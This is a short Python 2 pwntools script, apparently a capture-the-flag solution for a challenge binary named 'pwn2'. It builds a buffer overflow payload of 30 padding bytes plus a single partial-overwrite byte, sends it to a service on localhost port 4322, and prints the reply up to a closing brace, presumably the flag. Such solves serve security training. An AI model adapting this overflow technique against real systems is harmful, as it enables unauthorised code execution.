#!/usr/bin/env python2
from pwn import *

payload = 'A'*30 + '\xdc'

#conn = process('./pwn2')
conn = remote('127.0.0.1', 4322)
print conn.recvuntil('one!', drop=False)
conn.sendline(payload)
print conn.recvuntil('}', drop=False)
